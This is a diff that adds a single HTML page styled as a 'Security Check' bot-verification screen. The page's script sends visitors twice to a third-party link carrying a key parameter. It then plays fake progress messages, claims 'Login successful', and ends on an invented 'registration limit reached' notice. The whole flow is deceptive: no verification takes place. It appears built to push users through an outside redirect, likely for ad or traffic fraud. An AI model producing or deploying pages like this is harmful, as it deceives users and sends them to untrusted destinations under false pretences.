@@ -1,0 +1,247 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Security Check</title>
+  <style>
+    :root {
+      --bg: #f7f9fc;
+      --card: #ffffff;
+      --line: #e7edf3;
+      --fg: #0f172a;
+      --muted: #64748b;
+      --primary: #2563eb;
+      --primary-2: #1d4ed8;
+      --radius: 16px;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      background:
+        radial-gradient(1200px circle at 20% -10%, #eaf2ff 0%, transparent 60%),
+        radial-gradient(900px circle at 100% 120%, #f0f7ff 0%, transparent 60%),
+        var(--bg);
+      color: var(--fg);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      box-shadow: 0 24px 60px rgba(15, 23, 42, 0.08);
+      padding: 28px;
+      display: grid;
+      gap: 14px;
+      text-align: center;
+    }
+    .icon {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto 6px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, rgba(37,99,235,.12), rgba(29,78,216,.12));
+      display: grid;
+      place-items: center;
+      border: 1px solid var(--line);
+    }
+    h1 {
+      margin: 0;
+      font-size: 24px;
+      line-height: 30px;
+      font-weight: 800;
+      letter-spacing: .2px;
+    }
+    p { margin: 0; }
+    .desc {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 22px;
+    }
+    .btn {
+      display: inline-grid;
+      place-items: center;
+      height: 44px;
+      padding: 0 18px;
+      border-radius: 10px;
+      border: 1px solid transparent;
+      font-weight: 700;
+      font-size: 14px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: transform .16s ease, box-shadow .16s ease, filter .16s ease;
+    }
+    .btn.primary {
+      color: #fff;
+      background: linear-gradient(135deg, var(--primary), var(--primary-2));
+      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
+    }
+    .btn.primary:hover { filter: brightness(0.98); transform: translateY(-1px); box-shadow: 0 12px 30px rgba(37, 99, 235, 0.3); }
+    .fine {
+      font-size: 12px;
+      color: var(--muted);
+    }
+    .state { display: none; }
+    .state.active { display: grid; gap: 14px; }
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #dbe7ff;
+      border-top-color: var(--primary);
+      border-radius: 999px;
+      margin: 2px auto 6px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .notice {
+      background: #f1f5ff;
+      border: 1px solid #dbe7ff;
+      color: #0f3a8a;
+      border-radius: 10px;
+      padding: 12px 14px;
+      text-align: left;
+      font-size: 14px;
+      line-height: 20px;
+    }
+    .loading-lines {
+      display: grid;
+      gap: 6px;
+      color: var(--muted);
+      font-size: 14px;
+      min-height: 60px;
+    }
+    .loading-lines .line { opacity: .35; transform: translateY(6px); transition: all .3s ease; }
+    .loading-lines .line.show { opacity: 1; transform: translateY(0); }
+    @media (max-width: 420px) {
+      .card { padding: 22px; border-radius: 14px; }
+      h1 { font-size: 22px; line-height: 28px; }
+    }
+  </style>
+  <link rel="icon" href="data:,">
+</head>
+<body>
+  <main class="card">
+    <section id="state-start" class="state active">
+      <div class="icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M6 10V8a6 6 0 1 1 12 0v2" stroke="url(#g1)" stroke-width="2" stroke-linecap="round"/>
+          <rect x="4" y="10" width="16" height="10" rx="2" stroke="url(#g1)" stroke-width="2"/>
+          <path d="M12 14v3" stroke="url(#g1)" stroke-width="2" stroke-linecap="round"/>
+          <defs>
+            <linearGradient id="g1" x1="4" y1="8" x2="20" y2="20" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#2563eb"/><stop offset="1" stop-color="#1d4ed8"/>
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <h1>Security Check</h1>
+      <p class="desc">Before continuing, please complete a quick verification step to confirm you are a real user and not a bot.</p>
+      <a id="verify-btn" class="btn primary">Verify Account</a>
+      <p class="fine">This quick verification helps us prevent automated abuse and maintain service quality.</p>
+    </section>
+    <section id="state-loading" class="state">
+      <h1>Verifying your account...</h1>
+      <div class="spinner"></div>
+      <div class="loading-lines">
+        <div class="line" id="l1">Verifying your account...</div>
+        <div class="line" id="l2">Checking browser security...</div>
+      </div>
+    </section>
+    <section id="state-step2" class="state">
+      <h1>Verification required</h1>
+      <p class="desc">Please complete one more verification step to continue.</p>
+      <a id="verify2-btn" class="btn primary">Complete Verification</a>
+    </section>
+    <section id="state-loading2" class="state">
+      <h1>Finalizing verification...</h1>
+      <div class="spinner"></div>
+      <div class="loading-lines">
+        <div class="line" id="l4">Finalizing verification...</div>
+        <div class="line" id="l5">Preparing secure login...</div>
+      </div>
+    </section>
+    <section id="state-success" class="state">
+      <h1>Verification complete.</h1>
+      <p class="desc">Login successful.</p>
+    </section>
+    <section id="state-limit" class="state">
+      <h1>Registration limit reached</h1>
+      <div class="notice">
+        Registration limit reached.<br>
+        Due to extremely high demand, today's signup quota has been filled.<br>
+        New registrations will reopen tomorrow at 00:00 UTC.
+        <br> Please come back tomorrow.
+      </div>
+      <a id="back-home" href="./#home" class="btn">Back to Home</a>
+    </section>
+  </main>
+  <script>
+    var start=document.getElementById('state-start');
+    var loading=document.getElementById('state-loading');
+    var step2=document.getElementById('state-step2');
+    var loading2=document.getElementById('state-loading2');
+    var success=document.getElementById('state-success');
+    var limit=document.getElementById('state-limit');
+    function show(el){
+      [start,loading,step2,loading2,success,limit].forEach(function(x){x.classList.remove('active')});
+      el.classList.add('active');
+    }
+    function beginVerify(step){
+      localStorage.setItem('verify_step', step);
+      window.location.href='https://maddenwiped.com/mym08jba8?key=8c23d700e25d855509f58b27f2cb0835';
+    }
+    function onReturn(){
+      var step = localStorage.getItem('verify_step');
+      if(step==='1'){
+        show(loading);
+        var l1=document.getElementById('l1');
+        var l2=document.getElementById('l2');
+        setTimeout(function(){ l1.classList.add('show'); }, 100);
+        setTimeout(function(){ l2.classList.add('show'); }, 900);
+        setTimeout(function(){
+          show(step2);
+          localStorage.setItem('verify_step','1done');
+        }, 2200);
+      } else if(step==='1done'){
+        show(step2);
+      } else if(step==='2'){
+        show(loading2);
+        var l4=document.getElementById('l4');
+        var l5=document.getElementById('l5');
+        setTimeout(function(){ l4.classList.add('show'); }, 150);
+        setTimeout(function(){ l5.classList.add('show'); }, 1000);
+        setTimeout(function(){
+          show(success);
+        }, 2600);
+        setTimeout(function(){
+          show(limit);
+          localStorage.removeItem('verify_step');
+        }, 4200);
+      }
+    }
+    document.getElementById('verify-btn').addEventListener('click',function(e){
+      e.preventDefault();
+      beginVerify('1');
+    });
+    document.getElementById('verify2-btn').addEventListener('click',function(e){
+      e.preventDefault();
+      beginVerify('2');
+    });
+    document.getElementById('back-home').addEventListener('click',function(e){
+      e.preventDefault();
+      localStorage.removeItem('verify_step');
+      window.location.replace('./#home');
+    });
+    document.addEventListener('DOMContentLoaded', onReturn);
+    window.addEventListener('pageshow', onReturn);
+  </script>
+</body>
+</html>
